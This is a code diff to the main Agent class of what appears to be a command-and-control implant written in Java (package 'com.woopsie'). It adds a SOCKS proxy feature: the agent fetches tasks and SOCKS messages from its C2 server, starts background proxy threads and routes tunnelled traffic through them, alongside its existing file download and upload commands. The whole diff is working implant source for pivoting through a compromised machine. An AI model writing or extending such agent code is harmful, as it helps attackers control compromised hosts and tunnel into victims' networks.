@@ -17,7 +17,7 @@ public class Agent {
     private final Map<String, BackgroundTask> backgroundTasks;
     private volatile boolean running = true;
     
-    public Agent(Config config) {
+    public Agent(Config config) throws Exception {
         this.config = config;
         this.taskManager = new TaskManager(config);
         this.commHandler = new CommunicationHandler(config);
@@ -41,9 +41,24 @@ public class Agent {
         // Main agent loop
         while (running && !taskManager.shouldExit()) {
             try {
-                // Get tasks from C2
+                // Get tasks and SOCKS messages from C2
                 Config.debugLog(config, "Requesting tasks from C2...");
-                String[] tasks = commHandler.getTasks();
+                java.util.Map<String, Object> taskingResponse = commHandler.getTaskingResponse();
+                String[] tasks = (String[]) taskingResponse.get("tasks");
+                
+                // Route SOCKS messages to background tasks first
+                if (taskingResponse.containsKey("socks")) {
+                    @SuppressWarnings("unchecked")
+                    java.util.List<java.util.Map<String, Object>> socksMsgs = 
+                        (java.util.List<java.util.Map<String, Object>>) taskingResponse.get("socks");
+                    
+                    if (!socksMsgs.isEmpty()) {
+                        // Send the entire array to the background task (matches oopsie behavior)
+                        java.util.Map<String, Object> bgResp = new java.util.HashMap<>();
+                        bgResp.put("socks", socksMsgs);
+                        routeToBackgroundTask(bgResp);
+                    }
+                }
                 
                 if (tasks.length > 0) {
                     // Process all tasks and collect results
@@ -172,7 +187,7 @@ public class Agent {
      */
     private boolean isBackgroundCommand(String command) {
         // Commands that require background processing
-        return "download".equals(command) || "upload".equals(command);
+        return "download".equals(command) || "upload".equals(command) || "socks".equals(command);
     }
     
     /**
@@ -268,6 +283,30 @@ public class Agent {
                 
                 // Return the initial upload response (without completed flag)
                 return commHandler.createTaskResult(taskId, output);
+            } else if ("socks".equals(command)) {
+                // SOCKS proxy - start background task
+                Config.debugLog(config, "Starting SOCKS background task");
+                
+                // Execute the socks task to get initial response
+                String output = taskManager.executeTask(command, parameters);
+                
+                // Create the background task
+                final BackgroundTask[] taskHolder = new BackgroundTask[1];
+                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
+                    new com.woopsie.tasks.SocksBackgroundTask(taskHolder[0], config).run();
+                });
+                taskHolder[0] = bgTask;
+                
+                // Store the background task for later processing
+                backgroundTasks.put(taskId, bgTask);
+                
+                // Start the background task thread
+                bgTask.start();
+                
+                Config.debugLog(config, "Background SOCKS task started for: " + taskId);
+                
+                // Return the initial response (not completed)
+                return commHandler.createTaskResult(taskId, output);
             }
             
             return commHandler.createTaskError(taskId, "Unknown background command: " + command);
@@ -319,9 +358,33 @@ public class Agent {
      */
     private void routeToBackgroundTask(java.util.Map<String, Object> response) {
         try {
+            com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
+            com.fasterxml.jackson.databind.JsonNode messageNode = mapper.valueToTree(response);
+            
+            // Check if this is a SOCKS message (routed by command, not task_id)
+            if (response.containsKey("socks")) {
+                Config.debugLog(config, "===== ROUTING SOCKS MESSAGE =====");
+                Config.debugLog(config, "SOCKS message content: " + response);
+                Config.debugLog(config, "Active background tasks: " + backgroundTasks.size());
+                
+                // Find all active SOCKS background tasks
+                int socksTaskCount = 0;
+                for (BackgroundTask bgTask : backgroundTasks.values()) {
+                    Config.debugLog(config, "Checking task " + bgTask.getTaskId() + " with command: " + bgTask.getCommand());
+                    if ("socks".equals(bgTask.getCommand())) {
+                        socksTaskCount++;
+                        Config.debugLog(config, "Sending SOCKS message to task: " + bgTask.getTaskId());
+                        bgTask.sendToTask(messageNode);
+                    }
+                }
+                Config.debugLog(config, "Routed SOCKS message to " + socksTaskCount + " task(s)");
+                return;
+            }
+            
+            // Regular routing by task_id
             String taskId = (String) response.get("task_id");
             if (taskId == null || taskId.isEmpty()) {
-                Config.debugLog(config, "Background task response missing task_id");
+                Config.debugLog(config, "Background task response missing task_id and not a SOCKS message");
                 return;
             }
             
@@ -330,10 +393,6 @@ public class Agent {
                 Config.debugLog(config, "Background task not found for routing: " + taskId);
                 return;
             }
-            
-            // Convert response to JsonNode and send to background task
-            com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
-            com.fasterxml.jackson.databind.JsonNode messageNode = mapper.valueToTree(response);
             
             Config.debugLog(config, "Routing message to background task " + taskId + ": " + response);
             bgTask.sendToTask(messageNode);
@@ -359,8 +418,13 @@ public class Agent {
             
             // Poll for responses (non-blocking)
             java.util.Map<String, Object> response;
+            int responseCount = 0;
             while ((response = bgTask.pollResponse()) != null) {
+                responseCount++;
                 responses.add(response);
+            }
+            if (responseCount > 0) {
+                Config.debugLog(config, "Polled " + responseCount + " response(s) from task " + taskId);
             }
             
             // Only remove task if thread has actually died (not just marked complete)
@@ -385,7 +449,7 @@ public class Agent {
         running = false;
     }
     
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
         // Parse configuration from compile-time baked properties
         Config config = Config.fromResource();
         Config.debugLog(config, "Loading configuration...");
